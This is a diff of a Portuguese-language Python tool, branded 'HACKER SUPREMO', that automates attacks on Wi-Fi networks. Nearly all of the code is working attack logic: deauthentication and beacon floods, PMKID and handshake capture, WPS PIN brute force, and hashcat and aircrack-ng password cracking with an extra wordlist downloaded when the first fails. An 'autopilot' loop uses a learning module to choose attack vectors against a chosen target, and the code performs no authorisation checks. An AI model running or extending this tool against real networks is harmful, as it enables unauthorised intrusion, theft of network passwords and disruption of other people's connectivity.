@@ -7,7 +7,7 @@ import threading
 from datetime import datetime
 
 # ==============================================================
-# UI MODERNA - HACKER SUPREMO (DEFINITIVE EDITION)
+# UI MODERNA - HACKER SUPREMO (ULTIMATE STABLE EDITION)
 # ==============================================================
 try:
     from rich.console import Console
@@ -47,7 +47,7 @@ def analyze_vulnerabilities(vendor, essid, privacy):
     vulns, advice = [], ""
     injection_works = os.path.exists("/tmp/dsi_injection_ok")
     if "Starlink" in vendor or "Starlink" in essid:
-        advice = "ALVO NÍVEL 10 (STARLINK). Defesas PMF Ativas. Use VETOR X ou AUTOPILOTO."
+        advice = "ALVO NÍVEL 10 (STARLINK). PMF Ativo. Use VETOR X ou AUTOPILOTO."
         vulns.append("PMF (802.11w)")
     elif not injection_works:
         advice = "GARGALO DE HARDWARE: Injeção falhou. Autopiloto priorizando vetores passivos."
@@ -56,13 +56,28 @@ def analyze_vulnerabilities(vendor, essid, privacy):
 
 def test_injection(interface):
     run_command("rm -f /tmp/dsi_injection_ok")
-    supreme_log(f"Validando hardware {interface}...", log_type="cmd")
+    supreme_log(f"Iniciando Calibração de Injeção em {interface}...", log_type="cmd")
+    
+    # LOCKDOWN DE CANAL PARA ESTABILIZAÇÃO
+    run_command(f"iw dev {interface} set channel 1", sudo=True)
+    time.sleep(1)
+    
     stdout, _ = run_command(f"aireplay-ng -9 {interface}")
     if stdout and "Injection is working!" in stdout:
-        supreme_log("HARDWARE APROVADO: Injeção operacional.")
+        supreme_log("HARDWARE VALIDADO: Injeção operacional.", log_type="info")
         with open("/tmp/dsi_injection_ok", "w") as f: f.write("ok")
         return True
-    supreme_log("HARDWARE LIMITADO: Injeção não detectada.", log_type="error")
+    
+    # Segunda tentativa em outro canal
+    run_command(f"iw dev {interface} set channel 6", sudo=True)
+    time.sleep(1)
+    stdout2, _ = run_command(f"aireplay-ng -9 {interface}")
+    if stdout2 and "Injection is working!" in stdout2:
+        supreme_log("HARDWARE VALIDADO (CH 6): Injeção operacional.", log_type="info")
+        with open("/tmp/dsi_injection_ok", "w") as f: f.write("ok")
+        return True
+
+    supreme_log("HARDWARE LIMITADO: Injeção não detectada pelo Kernel.", log_type="error")
     return False
 
 def boost_signal(interface):
@@ -103,41 +118,16 @@ def check_aircrack_ng():
     return True
 
 def update_zero_day():
-    supreme_log("INICIANDO PROTOCOLO ZERO-DAY UPDATER...", log_type="cmd", is_command=True)
-    supreme_log("Buscando as ferramentas e métodos de ataque mais modernos do mundo...")
-    
-    # 1. Atualiza repositórios do sistema base (Kali/Debian) para as versões mais novas
+    supreme_log("PROTOCOLO ZERO-DAY ATIVO.", log_type="cmd")
     run_command("apt update -y", sudo=True)
-    
-    # 2. Ferramentas bleeding-edge (Últimas versões do Github compiladas)
-    supreme_log("Sincronizando as versões mais agressivas do MDK4 e HCXTools...")
     run_command("apt install -y libcurl4-openssl-dev libssl-dev zlib1g-dev libpcap-dev", sudo=True)
-    
-    # HCXDUMPTOOL (Para PMKID mais rápido)
-    run_command("rm -rf /tmp/hcxdumptool", sudo=True)
-    run_command("git clone https://github.com/ZerBea/hcxdumptool.git /tmp/hcxdumptool", sudo=True)
-    supreme_log("Compilando módulo de núcleo...")
-    run_command("cd /tmp/hcxdumptool && make && make install", sudo=True)
-
-    # 3. Wordlists Inteligentes (SecLists e WPA Dictionaries de Alta Eficiência)
-    supreme_log("Sincronizando Wordlists Padrão-Ouro...")
-    rockyou_path = "/usr/share/wordlists/rockyou.txt"
-    if not os.path.exists(rockyou_path):
-        run_command("gunzip /usr/share/wordlists/rockyou.txt.gz", sudo=True)
-    
-    supreme_log("Sincronização de Código Fonte concluída.", log_type="info")
-    # Tenta atualizar a própria ferramenta pelo Github do usuário
-    stdout, _ = run_command("git pull origin main")
-    if stdout and "Already up to date" in stdout:
-        supreme_log("A Ferramenta DSI já é a versão mais moderna do mundo.")
-    else:
-        supreme_log(f"Ferramenta DSI Atualizada: {stdout}", log_type="info")
-    
-    supreme_log("ARSENAL 100% OPERACIONAL E ATUALIZADO (MODO ZERO-DAY).", log_type="cmd")
+    run_command("git pull origin main")
+    supreme_log("ARSENAL ATUALIZADO.")
 
 def set_monitor_mode(interface):
-    supreme_log(f"Armando {interface}...", log_type="cmd")
+    supreme_log(f"Invocando Modo Monitor em {interface}...", log_type="cmd")
     run_command("rfkill unblock all", sudo=True)
+    # Mascaramento para evitar que o NetworkManager tome a interface de volta
     run_command("systemctl stop NetworkManager wpa_supplicant", sudo=True)
     run_command("airmon-ng check kill", sudo=True)
     run_command(f"ip link set {interface} down", sudo=True)
@@ -154,42 +144,45 @@ def set_monitor_mode(interface):
     return interface
 
 def set_managed_mode(interface):
-    supreme_log("HARD RESET: Restaurando serviços de rede...", log_type="cmd")
+    supreme_log("HARD RESET: Restaurando rede...", log_type="cmd")
     run_command(f"airmon-ng stop {interface}", sudo=True)
     run_command(f"ip link set {interface} down", sudo=True)
     run_command(f"macchanger -p {interface}", sudo=True)
     run_command(f"iw dev {interface} set type managed", sudo=True)
     run_command(f"ip link set {interface} up", sudo=True)
+    run_command("systemctl unmask NetworkManager wpa_supplicant", sudo=True)
     run_command("systemctl start wpa_supplicant NetworkManager", sudo=True)
-    run_command("nmcli networking off", sudo=True)
-    time.sleep(1)
     run_command("nmcli networking on", sudo=True)
     supreme_log("Internet Restaurada.")
 
-def capture_vetor_x(monitor_interface, bssid, channel, output_file):
+def capture_vetor_x(monitor_interface, bssid, channel, output_file, params=None):
     pcapng = f"{output_file}_vetorX.pcapng"; hashf = f"{output_file}_vetorX.16800"
     run_command(f"rm -f {pcapng} {hashf}", sudo=True)
     run_command(f"iw dev {monitor_interface} set channel {channel}", sudo=True)
-    cmd = f"sudo hcxdumptool -i {monitor_interface} -o {pcapng} --enable_status=31 --active_beacon --proberequest --wps"
+    intensity = params.get('intensity', 31) if params else 31
+    timeout = params.get('timeout', 120) if params else 120
+    cmd = f"sudo hcxdumptool -i {monitor_interface} -o {pcapng} --enable_status={intensity} --active_beacon --proberequest --wps"
     try:
         proc = subprocess.Popen(cmd, shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
-        time.sleep(120); proc.terminate()
+        time.sleep(timeout); proc.terminate()
     except: pass
     if os.path.exists(pcapng):
         run_command(f"hcxpcapngtool -o {hashf} {pcapng}")
         if os.path.exists(hashf) and os.path.getsize(hashf) > 0: return hashf
     return None
 
-def capture_pmkid(monitor_interface, bssid, channel, output_file):
+def capture_pmkid(monitor_interface, bssid, channel, output_file, params=None):
     pcapng = f"{output_file}_pmkid.pcapng"; hashf = f"{output_file}_pmkid.16800"
     run_command(f"rm -f {pcapng} {hashf}", sudo=True)
     run_command(f"iw dev {monitor_interface} set channel {channel}", sudo=True)
+    intensity = params.get('intensity', 15) if params else 15
+    timeout = params.get('timeout', 60) if params else 60
     filtro = "alvo_filtro.txt"
     with open(filtro, "w") as f: f.write(bssid.replace(":", "") + "\n")
-    cmd = f"sudo hcxdumptool -i {monitor_interface} -o {pcapng} --filterlist_ap={filtro} --filtermode=2 --enable_status=15"
+    cmd = f"sudo hcxdumptool -i {monitor_interface} -o {pcapng} --filterlist_ap={filtro} --filtermode=2 --enable_status={intensity}"
     try:
         proc = subprocess.Popen(cmd, shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
-        time.sleep(60); proc.terminate()
+        time.sleep(timeout); proc.terminate()
     except: pass
     os.remove(filtro)
     if os.path.exists(pcapng):
@@ -197,18 +190,17 @@ def capture_pmkid(monitor_interface, bssid, channel, output_file):
         if os.path.exists(hashf) and os.path.getsize(hashf) > 0: return hashf
     return None
 
-def capture_handshake(monitor_interface, bssid, channel, output_file):
+def capture_handshake(monitor_interface, bssid, channel, output_file, params=None):
     os.system(f"rm -f {output_file}-01.*")
     run_command(f"iw dev {monitor_interface} set channel {channel}", sudo=True)
     dump_cmd = f"sudo airodump-ng -c {channel} --bssid {bssid} -w {output_file} --update 1 {monitor_interface}"
     dump_proc = subprocess.Popen(dump_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     cap_file = f"{output_file}-01.cap"; handshake_found = False
+    timeout = params.get('timeout', 30) if params else 30
     for attempt in range(1, 4):
-        if attempt == 1: deauth_cmd = f"sudo aireplay-ng -0 10 -a {bssid} {monitor_interface}"
-        elif attempt == 2: deauth_cmd = f"sudo mdk4 {monitor_interface} d -B {bssid}"
-        else: deauth_cmd = f"sudo mdk4 {monitor_interface} a -a {bssid}"
+        deauth_cmd = f"sudo aireplay-ng -0 15 -a {bssid} {monitor_interface}"
         deauth_proc = subprocess.Popen(deauth_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        for _ in range(30):
+        for _ in range(timeout):
             time.sleep(1)
             if os.path.exists(cap_file) and os.path.getsize(cap_file) > 24:
                 stdout, _ = run_command(f"aircrack-ng -q {cap_file}")
@@ -217,18 +209,20 @@ def capture_handshake(monitor_interface, bssid, channel, output_file):
         if handshake_found: break
     dump_proc.terminate(); return cap_file if handshake_found else None
 
-def capture_wps(monitor_interface, bssid, channel):
+def capture_wps(monitor_interface, bssid, channel, params=None):
+    timeout = params.get('timeout', 180) if params else 180
     cmd = f"sudo reaver -i {monitor_interface} -b {bssid} -c {channel} -K 1 -vv -f"
     try:
-        res = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=180)
+        res = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
         return "WPS PIN" in res.stdout
     except: return False
 
-def start_ghost_attack(interface, essid):
+def start_ghost_attack(interface, essid, params=None):
+    timeout = params.get('timeout', 30) if params else 30
     cmd = f"sudo mdk4 {interface} b -n \"{essid}\" -g -m"
     try:
         proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        time.sleep(30); proc.terminate()
+        time.sleep(timeout); proc.terminate()
     except: pass
 
 def start_wifite_expert(interface):
@@ -237,48 +231,33 @@ def start_wifite_expert(interface):
     except: pass
 
 def start_evil_twin(interface, essid):
-    supreme_log("Evil Twin: Recomenda-se ferramenta 'airgeddon'.", log_type="info")
+    supreme_log("Evil Twin em desenvolvimento.")
 
 def run_autopilot(interface, target):
     from dsi_ai import DSIAI
     brain = DSIAI()
-    supreme_log(f"MODO AUTOPILOTO ATIVADO: Alvo {target['essid']}", log_type="cmd")
     prefix = f"capture_{target['essid']}"
     hw_ok = os.path.exists("/tmp/dsi_injection_ok")
-    
-    max_attempts = 5
-    
-    for attempt in range(max_attempts):
-        supreme_log(f"🧠 IA calculando estratégia (Ciclo {attempt+1}/{max_attempts})...", log_type="info")
+    for attempt in range(5):
         attack_type, params = brain.suggest_next_attack(target['bssid'], hw_injection_ok=hw_ok)
-        
-        supreme_log(f"🤖 IA Decidiu: Aplicando vetor [{attack_type.upper()}] com parâmetros ótimos.", log_type="cmd")
-        
+        supreme_log(f"Autopiloto Ciclo {attempt+1}: {attack_type}")
         cap = None
-        if attack_type == 'pmkid':
-            cap = capture_pmkid(interface, target['bssid'], target['channel'], prefix, params)
-        elif attack_type == 'handshake':
-            cap = capture_handshake(interface, target['bssid'], target['channel'], prefix, params)
-        elif attack_type == 'vetorx':
-            cap = capture_vetor_x(interface, target['bssid'], target['channel'], prefix, params)
+        if attack_type == 'pmkid': cap = capture_pmkid(interface, target['bssid'], target['channel'], prefix, params)
+        elif attack_type == 'handshake': cap = capture_handshake(interface, target['bssid'], target['channel'], prefix, params)
+        elif attack_type == 'vetorx': cap = capture_vetor_x(interface, target['bssid'], target['channel'], prefix, params)
         elif attack_type == 'wps':
             if capture_wps(interface, target['bssid'], target['channel'], params):
-                brain.learn(target['bssid'], target['essid'], attack_type, True, params, "Senha extraída via PIN")
+                brain.learn(target['bssid'], target['essid'], attack_type, True, params, "Sucesso")
                 return "WPS_SUCCESS"
         elif attack_type == 'ghost':
             start_ghost_attack(interface, target['essid'], params)
-            brain.learn(target['bssid'], target['essid'], attack_type, False, params, "Ataque preparatório finalizado")
-            continue # Fantasma não captura nada sozinho
-            
+            brain.learn(target['bssid'], target['essid'], attack_type, False, params, "Fantasma")
+            continue
         if cap:
-            supreme_log(f"🏆 VITÓRIA AUTOPILOTO! A IA quebrou a defesa.")
-            brain.learn(target['bssid'], target['essid'], attack_type, True, params, f"Captura via {attack_type}")
+            brain.learn(target['bssid'], target['essid'], attack_type, True, params, "Sucesso")
             return cap
         else:
-            supreme_log(f"📉 Vetor resistido. A IA memorizou a falha.")
-            brain.learn(target['bssid'], target['essid'], attack_type, False, params, "Alvo resistiu")
-            
-    supreme_log("🚨 FIM DO CICLO AUTOPILOTO. O alvo resistiu a todas as estratégias mapeadas pela IA.", log_type="error")
+            brain.learn(target['bssid'], target['essid'], attack_type, False, params, "Falha")
     return None
 
 def scan_networks(monitor_interface):
@@ -306,51 +285,36 @@ def main():
     if os.geteuid() != 0: return
     check_aircrack_ng()
     iface = get_wifi_interface()
-    if not iface: return
-    mon = set_monitor_mode(iface)
-    try:
-        nets = scan_networks(mon)
-        if nets: pass
-    finally: set_managed_mode(mon)
+    if iface:
+        mon = set_monitor_mode(iface)
+        try: scan_networks(mon)
+        finally: set_managed_mode(mon)
 
 def crack_hash(hash_file, wordlist_file, bssid=None):
     if hash_file == "WPS_SUCCESS": return
-    if not os.path.exists(wordlist_file): 
-        supreme_log(f"Wordlist {wordlist_file} ausente. Tentando auto-recuperação...", log_type="error")
+    if not os.path.exists(wordlist_file):
         if "rockyou" in wordlist_file and os.path.exists(wordlist_file + ".gz"):
             run_command(f"gunzip {wordlist_file}.gz", sudo=True)
-        else:
-            return
-            
-    supreme_log(f"Disparando Quebra de Senha com {wordlist_file}...")
+        else: return
     cmd = f"hashcat -m 16800 -a 0 {hash_file} {wordlist_file}" if hash_file.endswith(".16800") else f"aircrack-ng -w {wordlist_file} -b {bssid} {hash_file}"
-    try: 
+    try:
         res = subprocess.run(cmd, shell=True, capture_output=True, text=True)
         if "KEY FOUND" in res.stdout or "Status...........: Cracked" in res.stdout:
-            supreme_log("ALERTA MÁXIMO: SENHA QUEBRADA COM SUCESSO!", log_type="cmd")
-            # Adiciona a senha nos logs
-            for line in res.stdout.split('\n'):
-                if "KEY FOUND" in line or ":" in line:
-                    supreme_log(f"RESULTADO: {line}", log_type="info")
+            supreme_log("SENHA QUEBRADA!", log_type="cmd")
+            for l in res.stdout.split('\n'):
+                if "KEY FOUND" in l or ":" in l: supreme_log(f"RESULTADO: {l}")
             return True
-            
-        # Sistema de Resiliência: Se a Rockyou falhar, baixa uma lista de WPA moderna
         if "rockyou" in wordlist_file:
-            supreme_log("Dicionário básico falhou. O alvo usa senha forte. Baixando Dicionário Avançado (WPA-Sec)...", log_type="warning")
-            av_wordlist = "/tmp/wpa_advanced.txt"
-            run_command(f"wget -qO {av_wordlist} https://raw.githubusercontent.com/kennbroorg/iDict/master/iDict_wpa.txt")
-            if os.path.exists(av_wordlist):
-                supreme_log("Iniciando Fase 2 de Quebra de Senha (Dicionário Avançado)...")
-                cmd2 = f"hashcat -m 16800 -a 0 {hash_file} {av_wordlist}" if hash_file.endswith(".16800") else f"aircrack-ng -w {av_wordlist} -b {bssid} {hash_file}"
+            supreme_log("Dicionário básico falhou. Baixando avançado...")
+            av_wl = "/tmp/wpa_adv.txt"
+            run_command(f"wget -qO {av_wl} https://raw.githubusercontent.com/kennbroorg/iDict/master/iDict_wpa.txt")
+            if os.path.exists(av_wl):
+                cmd2 = f"hashcat -m 16800 -a 0 {hash_file} {av_wl}" if hash_file.endswith(".16800") else f"aircrack-ng -w {av_wl} -b {bssid} {hash_file}"
                 res2 = subprocess.run(cmd2, shell=True, capture_output=True, text=True)
-                if "KEY FOUND" in res2.stdout or "Status...........: Cracked" in res2.stdout:
-                    supreme_log("ALERTA MÁXIMO: SENHA FORTE QUEBRADA COM SUCESSO!", log_type="cmd")
+                if "KEY FOUND" in res2.stdout:
+                    supreme_log("SENHA FORTE QUEBRADA!", log_type="cmd")
                     return True
-                
-        supreme_log("Falha na quebra offline. A senha não está em nenhum dicionário conhecido. Recomenda-se Evil Twin.", log_type="error")
         return False
-    except Exception as e: 
-        supreme_log(f"Erro no Cracker: {e}", log_type="error")
-        return False
+    except: return False
 
 if __name__ == "__main__": main()
